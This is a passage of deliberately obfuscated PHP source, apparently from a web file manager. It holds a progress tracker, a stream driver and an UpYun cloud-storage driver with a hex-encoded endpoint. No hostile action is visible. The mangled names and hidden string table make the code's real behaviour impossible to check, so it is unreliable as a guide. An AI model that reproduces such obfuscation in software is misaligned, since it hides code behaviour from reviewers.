Hook::unbind($¤¼ôïöƒ[1901], array($this, $¤¼ôïöƒ[1891])); Hook::unbind($¤¼ôïöƒ[1893], array($this, $¤¼ôïöƒ[1894])); } public function updateAfter() { $ÁàãàÒŒ =& $_SERVER[¿ğÚ‰±–]; $ê¥ÇıÀ =& $this->task; if (!$ê¥ÇıÀ[$ÁàãàÒŒ[1148]] || !$ê¥ÇıÀ[$ÁàãàÒŒ[841]]) { return; } if ($ê¥ÇıÀ[$ÁàãàÒŒ[1895]] == $ÁàãàÒŒ[1286]) { $¨—²š¯Ò = $ê¥ÇıÀ[$ÁàãàÒŒ[1831]]; if ($ê¥ÇıÀ[$ÁàãàÒŒ[1832]] != $ÁàãàÒŒ[1286]) { $¨—²š¯Ò = 0; } $Úúç°Ò = ($ê¥ÇıÀ[$ÁàãàÒŒ[1835]] + $¨—²š¯Ò) / $ê¥ÇıÀ[$ÁàãàÒŒ[841]]; $ê¥ÇıÀ[$ÁàãàÒŒ[1779]] = $Úúç°Ò * 0.3; } else { if ($ê¥ÇıÀ[$ÁàãàÒŒ[1895]] == $ÁàãàÒŒ[389]) { $Úúç°Ò = $ê¥ÇıÀ[$ÁàãàÒŒ[1778]] / $ê¥ÇıÀ[$ÁàãàÒŒ[1148]]; $ê¥ÇıÀ[$ÁàãàÒŒ[1779]] = 0.3 + $Úúç°Ò * 0.5; } else { if ($ê¥ÇıÀ[$ÁàãàÒŒ[1895]] == $ÁàãàÒŒ[110]) { $Úúç°Ò = 0; if ($ê¥ÇıÀ[$ÁàãàÒŒ[1830]]) { $Úúç°Ò = $ê¥ÇıÀ[$ÁàãàÒŒ[1831]] / $ê¥ÇıÀ[$ÁàãàÒŒ[1830]]; } $ê¥ÇıÀ[$ÁàãàÒŒ[1779]] = 0.3 + 0.5 + $Úúç°Ò * 0.2; } } } if ($ê¥ÇıÀ[$ÁàãàÒŒ[1779]] > 0) { $©Ü±ÏŸç = timeFloat() - $ê¥ÇıÀ[$ÁàãàÒŒ[1781]] - $ê¥ÇıÀ[$ÁàãàÒŒ[1784]]; $ê¥ÇıÀ[$ÁàãàÒŒ[1785]] = $©Ü±ÏŸç * (1 - $ê¥ÇıÀ[$ÁàãàÒŒ[1779]]) / $ê¥ÇıÀ[$ÁàãàÒŒ[1779]]; } } public function copyFileStart($¡‡Ÿ¯³¤, $äøŸá’†, $ù¹Àçğ, $¼ë·‹¿Ë, $Íò³“Úß, $êİò÷™ ) { $öáÎÇ†´ =& $_SERVER[¿ğÚ‰±–]; parent::copyFileStart($¡‡Ÿ¯³¤, $äøŸá’†, $ù¹Àçğ, $¼ë·‹¿Ë, $Íò³“Úß, $êİò÷™ ); $¼ÏŞÀş© =& $this->task; if ($¼ÏŞÀş©[$öáÎÇ†´[1895]] == $öáÎÇ†´[389]) { $¼ÏŞÀş©[$öáÎÇ†´[1895]] = $öáÎÇ†´[110]; } $this->update(); } public function copyFileEnd($£Œ­÷Ò, $¥Â«Ò‘Æ, $¥Îˆ ¨, $²Ï©—Î“, $Ï‰ˆëŠæ, $®´££û) { $§Ä•é¾¹ =& $_SERVER[¿ğÚ‰±–]; $…³à·Ø  =& $this->task; $…³à·Ø [$§Ä•é¾¹[1831]] = $…³à·Ø [$§Ä•é¾¹[1830]]; $…³à·Ø [$§Ä•é¾¹[1835]] += $…³à·Ø [$§Ä•é¾¹[1830]]; $…³à·Ø [$§Ä•é¾¹[1832]] = $§Ä•é¾¹[12]; $this->update(); } public function zipEvent($‡ÅÄ–, $’«‘Œ, $¸ ÑÖ£Ë, $ôÇ²ØŒ°) { $ş«§ê =& $_SERVER[¿ğÚ‰±–]; $¬¬ÔÑª» =& $this->task; $¬¬ÔÑª»[$ş«§ê[1828]] = get_path_this($’«‘Œ); $¬¬ÔÑª»[$ş«§ê[1830]] = $ôÇ²ØŒ°; $¬¬ÔÑª»[$ş«§ê[1831]] = $¸ ÑÖ£Ë; $¬¬ÔÑª»[$ş«§ê[1150]] = $‡ÅÄ– == $ş«§ê[1903] ? $ş«§ê[1898] : $ş«§ê[1899]; $¬¬ÔÑª»[$ş«§ê[1832]] = $ş«§ê[12]; $¬¬ÔÑª»[$ş«§ê[841]] = $ôÇ²ØŒ°; $¬¬ÔÑª»[$ş«§ê[1895]] = $ş«§ê[389]; $this->update(); } public function nameParse($ò™Ò¨) { $†ÅáØ¯ =& $_SERVER[¿ğÚ‰±–]; $á ˆ€ÌĞ =& $this->task; if ($á ˆ€ÌĞ[$†ÅáØ¯[1778]] < $á ˆ€ÌĞ[$†ÅáØ¯[1148]]) { $ĞŠ¹–§ñ = get_path_this($ò™Ò¨); if (strstr($ĞŠ¹–§ñ, $†ÅáØ¯[10])) { $á ˆ€ÌĞ[$†ÅáØ¯[1778]] += 1; } } if ($á ˆ€ÌĞ[$†ÅáØ¯[1895]] == $†ÅáØ¯[1286]) { $á ˆ€ÌĞ[$†ÅáØ¯[1895]] = $†ÅáØ¯[389]; } $á ˆ€ÌĞ[$†ÅáØ¯[1828]] = $ò™Ò¨; $this->update(); } } goto CËŠ‚â¯ö; Cˆ¬¿õİ¯Œ: define($_SERVER[¿ğÚ‰±–][317], 3); define($_SERVER[¿ğÚ‰±–][318], 1); define($_SERVER[¿ğÚ‰±–][319], 0); goto DçÖäóĞÇë; F„½ÕŒÜ²Ì: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($á€Œéòñ, $ÚŞÏµ‡· = 0) { parent::__construct(); $this->source = $á€Œéòñ; $this->sourceSize = $ÚŞÏµ‡·; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($´¸ñ„ö¬ = false) { return $this->sourceSize; } public function getContent($æ†…¾¦ƒ = false) { return $this->fileSubstr($æ†…¾¦ƒ, 0, $this->sourceSize); } public function fileSubstr($œÀ©Ó¢ = false, $ûÚÃ¸ÇÂ = 0, $¶Î»î³• = 0) { if (!$¶Î»î³•) { $¶Î»î³• = $this->sourceSize; } $çÍ‡í˜– = $this->sourceSize - $ûÚÃ¸ÇÂ; if ($¶Î»î³• >= $çÍ‡í˜–) { $¶Î»î³• = $çÍ‡í˜–; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ûÚÃ¸ÇÂ, $¶Î»î³•); } if ($this->sourceType == self::TYPE_FILE) { if ($¶Î»î³• <= 0) { return $_SERVER[¿ğÚ‰±–][12]; } $ºã«î½— = ftell($this->source); fseek_64($this->source, $ºã«î½— + $ûÚÃ¸ÇÂ); $ÈÃüÁ = @fread($this->source, $¶Î»î³•); fseek_64($this->source, $ºã«î½—); return $ÈÃüÁ; } } public function hashMd5($ ƒ«Ù¬‰ = false) { return md5($this->getContent()); } public static function hash($Œí•¶¶Ç, $ğ°ôçë‚ = 0) { $ˆŞÚäúÈ = new PathDriverStream($Œí•¶¶Ç, $ğ°ôçë‚); return $ˆŞÚäúÈ->hashSimple($Œí•¶¶Ç); } public static function md5($Ø¬íôìù, $…îŸ»ö = 0) { $ŒÎæ÷«Ò = new PathDriverStream($Ø¬íôìù, $…îŸ»ö); return $ŒÎæ÷«Ò->hashMd5($Ø¬íôìù); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\x2f\x2f\x76\x30\56\141\x70\x69\x2e\165\160\171\165\x6e\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Éû«Ü) { parent::__construct(); $this->_init($Éû«Ü); } public function _init($õàóÃ•¦) { $‰ÖèŞâä =& $_SERVER[¿ğÚ‰±–]; foreach ($õàóÃ•¦ as $Á–§õËù => $ÇÄ¯ÄåŸ) { if (isset($this->{$Á–§õËù})) { $this->{$Á–§õËù} = $ÇÄ¯ÄåŸ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‰ÖèŞâä[1550] . LNG($‰ÖèŞâä[1469])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($éŠŠÈÆá, $”óš±ë = "\107\105\x54") { $ßò¿…¦— =& $_SERVER[¿ğÚ‰±–]; $º§³Õ„ = gmdate($ßò¿…¦—[1498]); $ÆÛ¤ù¬ñ = base64_encode(hash_hmac($ßò¿…¦—[1551], "{$”óš±ë}\46{$éŠŠÈÆá}\46{$º§³Õ„}", md5("{$this->userpass}"), !0)); $¦¥Š…ı = array("\x41\x75\164\x68\157\x72\151\172\141\164\151\157\156\72\x55\x50\131\125\116\40{$this->username}\x3a{$ÆÛ¤ù¬ñ}", "\104\x61\164\145\x3a{$º§³Õ„}"); return $¦¥Š…ı; } public function ussRequest($üÒ‚ô¦ñ, $Ó‚ ‰‹¿ = "\x47\x45\x54", $à„Œ©˜» = false, $¨­¬É­  = false, $ŞÏ­è  = false) { $‚¿ğ”£ =& $_SERVER[¿ğÚ‰±–]; $üÒ‚ô¦ñ = trim($üÒ‚ô¦ñ, $‚¿ğ”£[8]); $÷Ó’·ä· = "\x2f{$this->bucket}\x2f{$üÒ‚ô¦ñ}"; $‹Ï‡À¬ = $this->ussHeaders($÷Ó’·ä·, $Ó‚ ‰‹¿); if ($¨­¬É­ ) { $‹Ï‡À¬ = array_merge($‹Ï‡À¬, $¨­¬É­ ); } $Œ—Èî½‰ = url_request($this->endpoint . $÷Ó’·ä·, $Ó‚ ‰‹¿, $à„Œ©˜», $‹Ï‡À¬, $ŞÏ­è ); if (!$Œ—Èî½‰) { $•ºĞÔùÊ = LNG($‚¿ğ”£[1552]); $this->writeLog($•ºĞÔùÊ); return array($‚¿ğ”£[1304] => !1, $‚¿ğ”£[1294] => $•ºĞÔùÊ); } if (strtolower($Ó‚ ‰‹¿) == $‚¿ğ”£[227] || in_array($Œ—Èî½‰[$‚¿ğ”£[1304]], array($‚¿ğ”£[274], $‚¿ğ”£[1553]))) { $à„Œ©˜» = $Œ—Èî½‰[$‚¿ğ”£[1554]]; } else { $à„Œ©˜» = json_decode($Œ—Èî½‰[$‚¿ğ”£[1294]], !0); if (!$à„Œ©˜») { $à„Œ©˜» = $Œ—Èî½‰[$‚¿ğ”£[1294]]; } else { if (!$Œ—Èî½‰[$‚¿ğ”£[828]] && isset($à„Œ©˜»[$‚¿ğ”£[1555]])) { $à„Œ©˜» = $à„Œ©˜»[$‚¿ğ”£[1555]]; } } } if (!$Œ—Èî½‰[$‚¿ğ”£[828]]) { $this->writeLog($this->__errorMessage($à„Œ©˜»)); } return array($‚¿ğ”£[1304] => $Œ—Èî½‰[$‚¿ğ”£[828]], $‚¿ğ”£[1294] => $à„Œ©˜»); } private function __errorMessage($–Ğèì¦£) { $ãÌ›€ =& $_SERVER[¿ğÚ‰±–]; if (!$–Ğèì¦£) { return $ãÌ›€[12]; } static $Ğ¨’üá• = null; if (!$Ğ¨’üá•) { $Ğ¨’üá• = I18n::getType(); } if ($Ğ¨’üá• != $ãÌ›€[1508]) { return $–Ğèì¦£; } $ŞÓ•Í²â = array($ãÌ›€[1556] => $ãÌ›€[1557], $ãÌ›€[1558] => $ãÌ›€[1559], $ãÌ›€[1560] => $ãÌ›€[1559], $ãÌ›€[1561] => $ãÌ›€[1562], $ãÌ›€[1563] => $ãÌ›€[1564], $ãÌ›€[1565] => $ãÌ›€[1566], $ãÌ›€[1567] => $ãÌ›€[1568]); return isset($ŞÓ•Í²â[$–Ğèì¦£]) ? $ŞÓ•Í²â[$–Ğèì¦£] : $–Ğèì¦£; } public function mkfile($²Ï¸˜­è, $¥ç·‘´ = '', $†ˆÅÓñ = REPEAT_RENAME) { if ($this->setContent($²Ï¸˜­è, $¥ç·‘´)) { return $this->getPathOuter($²Ï¸˜­è); } return !1; } public function mkdir($¥ıÓ›ç­, $¾Â‘¯±Œ = REPEAT_SKIP) { $õ·©×¥¡ =& $_SERVER[¿ğÚ‰±–]; $¿÷çüÂş = trim($¥ıÓ›ç­, $õ·©×¥¡[8]); if ($this->_isFolder($¿÷çüÂş)) { return $this->getPathOuter($¿÷çüÂş); } $Ô€Û®• = array($õ·©×¥¡[1569]); $îöú×ÚÃ = $this->ussRequest($¿÷çüÂş, $õ·©×¥¡[257], !1, $Ô€Û®•); return $îöú×ÚÃ[$õ·©×¥¡[1304]] ? $this->getPathOuter($¿÷çüÂş) : !1; } public function copyFile($ñ‹ÃŞß, $µù•Æ€à) { $ƒÔÈÆ´ =& $_SERVER[¿ğÚ‰±–]; $Ô´Ú‹¬ë = array($ƒÔÈÆ´[1570] . "\x2f{$this->bucket}\57{$ñ‹ÃŞß}", $ƒÔÈÆ´[1571]); $ èœŠÆû = $this->ussRequest($µù•Æ€à, $ƒÔÈÆ´[259], !1, $Ô´Ú‹¬ë); return $ èœŠÆû[$ƒÔÈÆ´[1304]] ? !0 : $this->getPathOuter($µù•Æ€à); } public function moveFile($Ë¦°‡¶Á, $ÜÆê§“¡) { $è§º‰‡Î =& $_SERVER[¿ğÚ‰±–]; $—šøşˆÕ = array($è§º‰‡Î[1572] . "\x2f{$this->bucket}\x2f{$Ë¦°‡¶Á}", $è§º‰‡Î[1571]); $ƒğÙşÅÂ = $this->ussRequest($ÜÆê§“¡, $è§º‰‡Î[259], !1, $—šøşˆÕ); return $ƒğÙşÅÂ[$è§º‰‡Î[1304]] ? !0 : $this->getPathOuter($ÜÆê§“¡); } public function delFile($½±¾±İ) { $ÎùêË£µ =& $_SERVER[¿ğÚ‰±–]; $½”œâæ” = $this->ussRequest($½±¾±İ, $ÎùêË£µ[1573]); return $½”œâæ”[$ÎùêË£µ[1304]] ? !0 : !1; } public function delFolder($³¬…ò€¶) { $şî‡ÊÆ =& $_SERVER[¿ğÚ‰±–]; if (!$this->exist($³¬…ò€¶)) { return !0; } $this->listItemCache = !1; $ïŒ˜±÷‡ = $îçªÀğÀ = array(); $this->fileList($³¬…ò€¶, $ïŒ˜±÷‡, $îçªÀğÀ, !0); $this->listItemCache = !0; foreach ($îçªÀğÀ as $ÌÚ™ûÀ) { $Êş„ç¤ = $this->ussRequest($ÌÚ™ûÀ[$şî‡ÊÆ[32]], $şî‡ÊÆ[1573]); if (!$Êş„ç¤[$şî‡ÊÆ[1304]]) { return !1; } } foreach ($ïŒ˜±÷‡ as $’ï„·ç•) { $Êş„ç¤ = $this->ussRequest($’ï„·ç•, $şî‡ÊÆ[1573]); if (!$Êş„ç¤[$şî‡ÊÆ[1304]]) { return !1; } } $Êş„ç¤ = $this->ussRequest($³¬…ò€¶, $şî‡ÊÆ[1573]); return $Êş„ç¤[$şî‡ÊÆ[1304]]; } public function rename($Ô²áø§, $şâ—Ÿµ©) { if ($this->isFile($Ô²áø§)) { $şâ—Ÿµ© = get_path_father($Ô²áø§) . $şâ—Ÿµ©; return $this->moveFile($Ô²áø§, $şâ—Ÿµ©); } return $this->renameObject($Ô²áø§, $şâ—Ÿµ©); } public function fileInfo($ª¦†§•©, $¿Ç±ÔÈ˜ = false, $’üé–ó‹ = array()) { $à§Ö¡Ñâ =& $_SERVER[¿ğÚ‰±–]; $¯ş¶¸ı = array($à§Ö¡Ñâ[32] => $this->pathThis($ª¦†§•©), $à§Ö¡Ñâ[87] => $this->getPathOuter($à§Ö¡Ñâ[8] . $ª¦†§•©), $à§Ö¡Ñâ[33] => $à§Ö¡Ñâ[230], $à§Ö¡Ñâ[79] => isset($’üé–ó‹[$à§Ö¡Ñâ[79]]) ? $’üé–ó‹[$à§Ö¡Ñâ[79]] : 0, $à§Ö¡Ñâ[169] => $this->ext($ª¦†§•©)); if ($¿Ç±ÔÈ˜) { return $¯ş¶¸ı; } $¯ş¶¸ı[$à§Ö¡Ñâ[231]] = $¯ş¶¸ı[$à§Ö¡Ñâ[88]] = 0; $¯ş¶¸ı[$à§Ö¡Ñâ[232]] = $¯ş¶¸ı[$à§Ö¡Ñâ[233]] = !0; if (empty($’üé–ó‹)) { $’üé–ó‹ = $this->objectMeta($ª¦†§•©); if (!$’üé–ó‹) { return $¯ş¶¸ı; } } $¯ş¶¸ı[$à§Ö¡Ñâ[231]] = intval($’üé–ó‹[$à§Ö¡Ñâ[1574]]); $¯ş¶¸ı[$à§Ö¡Ñâ[88]] = intval($’üé–ó‹[$à§Ö¡Ñâ[1575]]); $¯ş¶¸ı[$à§Ö¡Ñâ[79]] = $’üé–ó‹[$à§Ö¡Ñâ[79]]; return $¯ş¶¸ı; } public function folderInfo($ŸÔÃ‘§, $ßâ˜É­‡ = false) { $ÂúÅ°ÁÉ =& $_SERVER[¿ğÚ‰±–]; $ñ‚¿ôñì = array($ÂúÅ°ÁÉ[32] => $this->pathThis($ŸÔÃ‘§), $ÂúÅ°ÁÉ[87] => $this->getPathOuter($ÂúÅ°ÁÉ[8] . $ŸÔÃ‘§), $ÂúÅ°ÁÉ[33] => $ÂúÅ°ÁÉ[78]); if ($ßâ˜É­‡) { return $ñ‚¿ôñì; } $ñ‚¿ôñì[$ÂúÅ°ÁÉ[231]] = $ñ‚¿ôñì[$ÂúÅ°ÁÉ[88]] = 0; $ñ‚¿ôñì[$ÂúÅ°ÁÉ[232]] = $ñ‚¿ôñì[$ÂúÅ°ÁÉ[233]] = !0; if (empty($øÑ§ØŠ)) { $øÑ§ØŠ = $this->objectMeta($ŸÔÃ‘§); if (!$øÑ§ØŠ) { return $ñ‚¿ôñì; } } $ñ‚¿ôñì[$ÂúÅ°ÁÉ[231]] = intval($øÑ§ØŠ[$ÂúÅ°ÁÉ[1574]]); $ñ‚¿ôñì[$ÂúÅ°ÁÉ[88]] = intval($øÑ§ØŠ[$ÂúÅ°ÁÉ[1575]]); return $ñ‚¿ôñì; } private function listObjs($éğËæ, $ˆ¬ìĞĞ£ = 0, $Á¸ÜüÌğ = 1000) { $Œáœ±¦¬ =& $_SERVER[¿ğÚ‰±–]; $û–êäƒ€ = array($Œáœ±¦¬[1576], $Œáœ±¦¬[1577] . $Á¸ÜüÌğ); if ($ˆ¬ìĞĞ£) { $û–êäƒ€[] = $Œáœ±¦¬[1578] . $ˆ¬ìĞĞ£; } $À‡¤£ Š = $this->ussRequest($éğËæ, $Œáœ±¦¬[261], !1, $û–êäƒ€); return !$À‡¤£ Š[$Œáœ±¦¬[1304]] ? !1 : $À‡¤£ Š[$Œáœ±¦¬[1294]]; } private function fileList($û­ÖÕç, &$›í¾åòÂ, &$¨î¥Å†¼, $…©şï’ = false) { $–ĞÍîú =& $_SERVER[¿ğÚ‰±–]; $×æ˜¨°Ô = $–ĞÍîú[12]; $ŸŒÚ¬ÑÂ = 1000; $ÎšÄêï„ = rtrim($û­ÖÕç, $–ĞÍîú[8]) . $–ĞÍîú[8]; while (!0) { check_abort(); $Ù”ßµ¸Ì = $this->listObjs($û­ÖÕç, $×æ˜¨°Ô, $ŸŒÚ¬ÑÂ); if (!$Ù”ßµ¸Ì) { return !1; } $×æ˜¨°Ô = isset($Ù”ßµ¸Ì[$–ĞÍîú[1579]]) ? $Ù”ßµ¸Ì[$–ĞÍîú[1579]] : $–ĞÍîú[12]; $Áöü§µ² = isset($Ù”ßµ¸Ì[$–ĞÍîú[1580]]) ? $Ù”ßµ¸Ì[$–ĞÍîú[1580]] : array(); foreach ($Áöü§µ² as $ÂÆµùÙ«) { $€öÍ¥³ˆ = $ÂÆµùÙ«[$–ĞÍîú[33]] == $–ĞÍîú[78] ? !0 : !1; $æâİ€î› = ltrim($ÎšÄêï„ . $ÂÆµùÙ«[$–ĞÍîú[32]], $–ĞÍîú[8]) . ($€öÍ¥³ˆ ? $–ĞÍîú[8] : $–ĞÍîú[12]); $µçšòì” = array($–ĞÍîú[32] => $æâİ€î›, $–ĞÍîú[33] => $€öÍ¥³ˆ ? $–ĞÍîú[78] : $–ĞÍîú[230], $–ĞÍîú[79] => $ÂÆµùÙ«[$–ĞÍîú[413]], $–ĞÍîú[1575] => $ÂÆµùÙ«[$–ĞÍîú[1581]]); $this->cacheMethodInfoSet($æâİ€î›, $€öÍ¥³ˆ, $µçšòì”); if ($€öÍ¥³ˆ) { $›í¾åòÂ[] = $æâİ€î›; if ($…©şï’) { $this->fileList($æâİ€î›, $›í¾åòÂ, $¨î¥Å†¼, $…©şï’); } continue; } $¨î¥Å†¼[] = $µçšòì”; } if (count($Áöü§µ²) < $ŸŒÚ¬ÑÂ) { break; } } $this->cacheMethodInfoSet($û­ÖÕç, !0); } public function listPath($êµÔÅæÁ, $Šœ›Î = false) { $Ş´õ·„® =& $_SERVER[¿ğÚ‰±–]; $–Çı¤ŞÂ = $¢Ô¸‚ = array(); $this->fileList($êµÔÅæÁ, $–Çı¤ŞÂ, $¢Ô¸‚); foreach ($–Çı¤ŞÂ as $›Ï®ßï† => $ä¸‹Õ†‚) { $–Çı¤ŞÂ[$›Ï®ßï†] = $this->folderInfo($ä¸‹Õ†‚, $Šœ›Î); } foreach ($¢Ô¸‚ as $›Ï®ßï† => $ä¸‹Õ†‚) { $¢Ô¸‚[$›Ï®ßï†] = $this->fileInfo($ä¸‹Õ†‚[$Ş´õ·„®[32]], $Šœ›Î, $ä¸‹Õ†‚); } return array($Ş´õ·„®[85] => $–Çı¤ŞÂ, $Ş´õ·„®[86] => $¢Ô¸‚); } public function has($ÙŞ”‚ªœ, $ÊšÛ·›» = false, $üÃœ˜Ò = true) { $Á¶±·íÑ =& $_SERVER[¿ğÚ‰±–]; $êàÁ×Ğ• = $Á¶±·íÑ[12]; $èˆÆí²ô = 500; $ø…õÇ ˜ = 0; $²§óğÁ¢ = 0; $Ÿ¦¨•è§ = rtrim($ÙŞ”‚ªœ, $Á¶±·íÑ[8]) . $Á¶±·íÑ[8]; while (!0) { check_abort(); $²Éèüœ¾ = $this->listObjs($ÙŞ”‚ªœ, $êàÁ×Ğ•, $èˆÆí²ô); if (!$²Éèüœ¾) { return !1; } $êàÁ×Ğ• = isset($²Éèüœ¾[$Á¶±·íÑ[1579]]) ? $²Éèüœ¾[$Á¶±·íÑ[1579]] : $Á¶±·íÑ[12]; $›¶Üå€Ú = isset($²Éèüœ¾[$Á¶±·íÑ[1580]]) ? $²Éèüœ¾[$Á¶±·íÑ[1580]] : array(); if (empty($›¶Üå€Ú)) { break; } $ÙçÂ»× = array_filter($›¶Üå€Ú, function ($”ºÔ—Ùè) { $Ÿè¾äı =& $_SERVER[¿ğÚ‰±–]; return $”ºÔ—Ùè[$Ÿè¾äı[33]] == $Ÿè¾äı[78]; }); $Ûê­æà½ = count($›¶Üå€Ú); $ÙçÂ»× = count($ÙçÂ»×); $Û‰şëó¹ = $Ûê­æà½ - $ÙçÂ»×; if ($ÊšÛ·›») { $²§óğÁ¢ += $ÙçÂ»×; $ø…õÇ ˜ += $Û‰şëó¹; if ($Ûê­æà½ < $èˆÆí²ô) { break; } continue; } if ($üÃœ˜Ò) { if ($Û‰şëó¹) { return !0; } } else { if ($ÙçÂ»×) { return !0; } } if ($Ûê­æà½ < $èˆÆí²ô) { break; } } if ($ÊšÛ·›») { return array($Á¶±·íÑ[239] => $ø…õÇ ˜, $Á¶±·íÑ[240] => $²§óğÁ¢); } return !1; } public function listAll($¢ÅÉ¼‘) { $±İäÄÔ„ =& $_SERVER[¿ğÚ‰±–]; $ÇòÖÍ¼ç = $‹úŞìè = array(); $this->fileList($¢ÅÉ¼‘, $ÇòÖÍ¼ç, $‹úŞìè, !0); $ú•®üå = array_to_keyvalue($‹úŞìè, $±İäÄÔ„[32]); foreach ($ÇòÖÍ¼ç as $Ñ‘áğöô) { if (is_string($Ñ‘áğöô)) { $ú•®üå[$Ñ‘áğöô] = array($±İäÄÔ„[79] => 0); } } return $this->listAllFiles($¢ÅÉ¼‘, $ú•®üå); } public function canRead($ÔƒÜŞß) { return $this->exist($ÔƒÜŞß) ? !0 : !1; } public function canWrite($†õÉ»ä) { return $this->exist($†õÉ»ä) ? !0 : !1; } public function getContent($È«¬óÓ) { return $this->fileSubstr($È«¬óÓ, 0, -1); } public function setContent($¦öÛò«â, $µ”ü¢Ø‡ = '') { $ÅÔ™ïô =& $_SERVER[¿ğÚ‰±–]; if (!$µ”ü¢Ø‡) { $ÁÂ¼³†î = $this->ussRequest($¦öÛò«â, $ÅÔ™ïô[257]); return $ÁÂ¼³†î[$ÅÔ™ïô[1304]]; } $¡ÕÒ‚ğ÷ = $this->tempFile($this->pathThis($¦öÛò«â)); file_put_contents($¡ÕÒ‚ğ÷, $µ”ü¢Ø‡); if ($this->upload($¦öÛò«â, $¡ÕÒ‚ğ÷)) { $this->tempFileRemve($¡ÕÒ‚ğ÷); return !0; } return !1; } public function fileSubstr($½º¥¨ŠÊ, $‚÷”È¨İ, $ê”ø óæ) { $Îã§”Ï =& $_SERVER[¿ğÚ‰±–]; if (!($”æ±»§Å = $this->link($½º¥¨ŠÊ))) { return !1; } $Á½¤ÛÜæ = !1; if ($ê”ø óæ > 0) { $Úñı±¥ = $‚÷”È¨İ + $ê”ø óæ - 1; $Á½¤ÛÜæ = array($Îã§”Ï[1540] . $‚÷”È¨İ . $Îã§”Ï[462] . $Úñı±¥); } $–¬­ëã› = url_request($”æ±»§Å, $Îã§”Ï[261], !1, $Á½¤ÛÜæ); return $–¬­ëã›[$Îã§”Ï[828]] ? $–¬­ëã›[$Îã§”Ï[1294]] : !1; } public function upload($Ğú¤À, $ô¡°–¶, $¾¶»¨²„ = false, $ƒ¤™Ñü = REPEAT_REPLACE) { $ü­€ö¼Ë =& $_SERVER[¿ğÚ‰±–]; $âÊˆ¾öÈ = IO::size($ô¡°–¶); if ($âÊˆ¾öÈ <= 1024 * 1024 * 200) { $Õä€óŠë = array($ü­€ö¼Ë[1582] . $ô¡°–¶); $µˆôÑ—Œ = $this->ussRequest($Ğú¤À, $ü­€ö¼Ë[259], $Õä€óŠë); return $µˆôÑ—Œ[$ü­€ö¼Ë[1304]] ? $this->getPathOuter($Ğú¤À) : !1; } $¦ª›ë´ = 1024 * 1024 * 10; $¾û³ØÉÍ = array($ü­€ö¼Ë[1583], $ü­€ö¼Ë[1584] . $âÊˆ¾öÈ, $ü­€ö¼Ë[1585], $ü­€ö¼Ë[1586] . $¦ª›ë´); $µˆôÑ—Œ = $this->ussRequest($Ğú¤À, $ü­€ö¼Ë[259], !1, $¾û³ØÉÍ); if (!$µˆôÑ—Œ[$ü­€ö¼Ë[1304]]) { return !1; } $—êˆ¡§Ğ = $µˆôÑ—Œ[$ü­€ö¼Ë[1294]]; $õÅé¯–Â = 0; $Ç¿ĞŸÈ = $—êˆ¡§Ğ[$ü­€ö¼Ë[1587]]; $Ã¢…›ÅÊ = fopen($ô¡°–¶, $ü­€ö¼Ë[1463]); if (!$Ã¢…›ÅÊ) { return !1; } do { $àğ‚ùœ = $—êˆ¡§Ğ[$ü­€ö¼Ë[1588]]; fseek_64($Ã¢…›ÅÊ, $õÅé¯–Â); $Îıº¼°ø = fread($Ã¢…›ÅÊ, $àğ‚ùœ); $¦±´ûŠ = 0; do { $¦±´ûŠ++; $—êˆ¡§Ğ = $this->uploadPart($Ğú¤À, $—êˆ¡§Ğ, $Îıº¼°ø); } while (!$—êˆ¡§Ğ && $¦±´ûŠ < 3); if (!$—êˆ¡§Ğ) { return !1; } $Ç¿ĞŸÈ = $—êˆ¡§Ğ[$ü­€ö¼Ë[1587]]; $õÅé¯–Â += $àğ‚ùœ; } while ($Ç¿ĞŸÈ != -1); fclose($Ã¢…›ÅÊ); $¾û³ØÉÍ = array($ü­€ö¼Ë[1589], $ü­€ö¼Ë[1590] . $—êˆ¡§Ğ[$ü­€ö¼Ë[1591]], $ü­€ö¼Ë[1585]); $µˆôÑ—Œ = $this->ussRequest($Ğú¤À, $ü­€ö¼Ë[259], !1, $¾û³ØÉÍ); return $µˆôÑ—Œ[$ü­€ö¼Ë[1304]] ? $this->getPathOuter($ıªâëãÅ) : !1; } private function uploadPart($—¾Á³À‚, $Ìıù¨¦, &$è¥öüÂğ) { $Á¬®ßÚã =& $_SERVER[¿ğÚ‰±–]; $˜™áéñÀ = array($Á¬®ßÚã[1592], $Á¬®ßÚã[1590] . $Ìıù¨¦[$Á¬®ßÚã[1591]], $Á¬®ßÚã[1593] . $Ìıù¨¦[$Á¬®ßÚã[1587]], $Á¬®ßÚã[146] . $Ìıù¨¦[$Á¬®ßÚã[1588]]); $Â½Ùæ¼œ = $this->ussRequest($—¾Á³À‚, $Á¬®ßÚã[259], $è¥öüÂğ, $˜™áéñÀ); return !$Â½Ùæ¼œ[$Á¬®ßÚã[1304]] ? $Â½Ùæ¼œ[$Á¬®ßÚã[1304]] : $Â½Ùæ¼œ[$Á¬®ßÚã[1294]]; } public function uploadFormData($ä÷ÄöÍ•, $µ¦±½ùŸ = 3600) { return $this->uploadPolicy($ä÷ÄöÍ•, $µ¦±½ùŸ); } public function multiUploadFormData($¦åìÍù, $“ª–¨âË = 3600) { $°‡Üã‡Ğ =& $_SERVER[¿ğÚ‰±–]; $ó‡§îïã = (int) $GLOBALS[$°‡Üã‡Ğ[7]][$°‡Üã‡Ğ[79]]; return $this->uploadPolicy($¦åìÍù, $“ª–¨âË, $ó‡§îïã); } private function uploadPolicy($ˆ‡šµ™, $Üû˜•à = 3600, $ëì„Ë = 0) { $ƒü¬²Ğ¦ =& $_SERVER[¿ğÚ‰±–]; $à×ğµÙÂ = $ƒü¬²Ğ¦[8] . $this->bucket; $½¤¿İ§· = gmdate($ƒü¬²Ğ¦[1498]); $ÁË¤ôÃ = array($ƒü¬²Ğ¦[1594] => $this->bucket, $ƒü¬²Ğ¦[1595] => $ˆ‡šµ™, $ƒü¬²Ğ¦[1596] => time() + $Üû˜•à, $ƒü¬²Ğ¦[1597] => $½¤¿İ§·); if ($ëì„Ë) { 